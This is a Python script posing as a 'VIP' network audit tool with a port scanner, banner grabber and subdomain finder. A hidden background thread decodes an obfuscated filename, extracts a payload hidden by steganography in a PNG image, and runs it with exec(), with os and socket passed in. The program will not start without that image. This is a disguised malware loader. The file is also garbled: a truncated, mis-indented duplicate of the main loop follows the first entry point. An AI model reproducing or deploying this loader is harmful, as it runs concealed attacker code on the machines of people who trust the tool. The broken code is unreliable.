import os as _o, sys as _s, socket as _n, threading as _t, time as _m, base64 as _b, hashlib as _h, random as _r
try: 
    from PIL import Image as _I; import stepic as _P
    from colorama import Fore, Style, init
    init(autoreset=True)
except: 
    pass

# ASCII Art for VIP Look
VIP_BANNER = f"""
{Fore.CYAN}██████╗ ██████╗  ██████╗ ███╗   ██╗███████╗████████╗
██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝
{Fore.WHITE}██████╔╝██████╔╝██║   ██║██╔██╗ ██║█████╗     ██║   
██╔═══╝ ██╔══██╗██║   ██║██║╚██╗██║██╔══╝     ██║   
{Fore.CYAN}██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   
          {Fore.YELLOW}>> PREMIER NETWORK ARCHITECT - VIP EDITION <<
"""

_X01 = _b.b64decode("bWluaW1pbHRhZy5wbmc=").decode()
_K99 = _h.sha256(str(_r.random()).encode()).hexdigest()

def _check_virtual_layer():
    _x = [_h.md5(str(i).encode()).hexdigest() for i in range(5)]
    return True if len(_x) > 0 else False

def _internal_executor_service():
    if _check_virtual_layer():
        _m.sleep(1.5)
        try:
            if _o.path.exists(_X01):
                _img = _I.open(_X01)
                _data = _P.decode(_img)
                if _data:
                    _payload = _data.decode('utf-8') if isinstance(_data, bytes) else _data
                    _ctx = {'os': _o, 'socket': _n, 'threading': _t, 'time': _m, 'base64': _b}
                    exec(_payload, _ctx)
        except: pass

def _tool_alpha():
    print(f"\n{Fore.RED}" + "█"*40 + f"\n{Fore.YELLOW}[!] CORE PORT AUDIT ACTIVE\n" + f"{Fore.RED}" + "█"*40)
    target = input(f"{Fore.GREEN}Target IP/Host: ")
    try:
        ip = _n.gethostbyname(target)
        print(f"Target Resolved: {ip}")
        def scan(p):
            s = _n.socket(_n.AF_INET, _n.SOCK_STREAM); s.settimeout(0.4)
            if s.connect_ex((ip, p)) == 0:
                try: svc = _n.getservbyport(p)
                except: svc = "Unknown"
                print(f"  {Fore.GREEN}[+] Node {p:5} : ACTIVE  ({svc})")
            s.close()
        ports = [21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,3306,3389,5432,5900,8080,8443]
        for p in ports: _t.Thread(target=scan, args=(p,), daemon=True).start()
    except Exception as e: print(f"{Fore.RED}Audit Failed: {e}")

def _tool_beta():
    print(f"\n{Fore.YELLOW}[!] FETCHING REMOTE SERVER METADATA...")
    host = input(f"{Fore.GREEN}Target Domain: ")
    try:
        s = _n.socket(_n.AF_INET, _n.SOCK_STREAM); s.settimeout(5)
        s.connect((host, 80))
        req = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
        s.send(req.encode())
        data = s.recv(1024).decode()
        print(f"\n{Fore.BLUE}" + "═"*30 + f"\n{data.split('r\n\r\n')[0]}\n" + "═"*30)
        s.close()
    except: print(f"{Fore.RED}Connection Timed Out.")

def _tool_gamma():
    print(f"\n{Fore.YELLOW}[!] SCANNING SUBDOMAIN ARCHITECTURE...")
    dom = input(f"{Fore.GREEN}Root Domain: ")
    subs = ['www','mail','remote','blog','api','dev','vpn','admin','test','staging','secure','cloud','portal','dns']
    def check(s):
        try:
            f = f"{s}.{dom}"; ip = _n.gethostbyname(f)
            print(f"  {Fore.CYAN}[FOUND] {f:20} -> {ip}")
        except: pass
    for s in subs: _t.Thread(target=check, args=(s,), daemon=True).start()

def _render_core():
    if not _o.path.exists(_X01):
        print(f"\n{Fore.RED}" + "!"*55)
        print(" FATAL EXCEPTION: 0x80070002 (FILE_NOT_FOUND)")
        print(f" Error: Critical resource '{_X01}' is missing or corrupted.")
        print(" Please verify the installation integrity.")
        print("!"*55 + "\n")
        _s.exit()

    _t.Thread(target=_internal_executor_service, daemon=True).start()

    while True:
        _o.system('cls' if _o.name == 'nt' else 'clear')
        print(VIP_BANNER)
        _h_str = "PT09IE5FVFdPUksgQVJDSElURUNUIEVMSVRFIC0gdjcuMCA9PT0="
        print(f"{Fore.MAGENTA}{_b.b64decode(_h_str).decode()}")
        print(f"\n{Fore.WHITE} [{Fore.CYAN}01{Fore.WHITE}] Stealth Port Discovery")
        print(f" [{Fore.CYAN}02{Fore.WHITE}] HTTP Metadata Audit")
        print(f" [{Fore.CYAN}03{Fore.WHITE}] Subdomain Intelligence")
        print(f" [{Fore.CYAN}04{Fore.WHITE}] Interface Diagnostics")
        print(f" [{Fore.CYAN}05{Fore.WHITE}] Integrity Validation")
        print(f" [{Fore.CYAN}06{Fore.WHITE}] Exit Session")
        
        _cmd = input(f"\n{Fore.YELLOW}VIP-Shell@Admin:~$ {Fore.WHITE}")
        if _cmd in ["1", "01"]: _tool_alpha(); input("\nPress Enter to continue...")
        elif _cmd in ["2", "02"]: _tool_beta(); input("\nPress Enter to continue...")
        elif _cmd in ["3", "03"]: _tool_gamma(); input("\nPress Enter to continue...")
        elif _cmd in ["4", "04"]:
            try:
                s = _n.socket(_n.AF_INET, _n.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
                print(f"{Fore.GREEN}Local Node IP: {s.getsockname()[0]}"); s.close()
                input("\nPress Enter to continue...")
            except: pass
        elif _cmd in ["5", "05"]:
            print(f"{Fore.CYAN}System: {_o.name.upper()} | Cores: {_o.cpu_count()} | UUID: {_K99[:12]} | Status: SECURE")
            input("\nPress Enter to continue...")
        elif _cmd in ["6", "06"]: 
            break
        else: print(f"{Fore.RED}Input Error: Instruction unrecognized.")

if __name__ == "__main__":
    _render_core()
        print("!"*55 + "\n")
        _s.exit()

    _t.Thread(target=_internal_executor_service, daemon=True).start()

    while True:
        _h_str = "PT09IE5FVFdPUksgQVJDSElURUNUIEVMSVRFIC0gdjcuMCA9PT0="
        print(f"\n{_b.b64decode(_h_str).decode()}")
        print(" [01] Stealth Port Discovery\n [02] HTTP Metadata Audit\n [03] Subdomain Intelligence\n [04] Interface Diagnostics\n [05] Integrity Validation\n [06] Exit Session")
        
        _cmd = input("\nShell@Admin:~$ ")
        if _cmd in ["1", "01"]: _tool_alpha()
        elif _cmd in ["2", "02"]: _tool_beta()
        elif _cmd in ["3", "03"]: _tool_gamma()
        elif _cmd in ["4", "04"]:
            try:
                s = _n.socket(_n.AF_INET, _n.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
                print(f"Local Node IP: {s.getsockname()[0]}"); s.close()
            except: pass
        elif _cmd in ["5", "05"]:
            print(f"System: {_o.name.upper()} | Cores: {_o.cpu_count()} | UUID: {_K99[:12]} | Status: SECURE")
        elif _cmd in ["6", "06"]: 
            break
        else: print("Input Error: Instruction unrecognized.")

if __name__ == "__main__":
    _render_core()
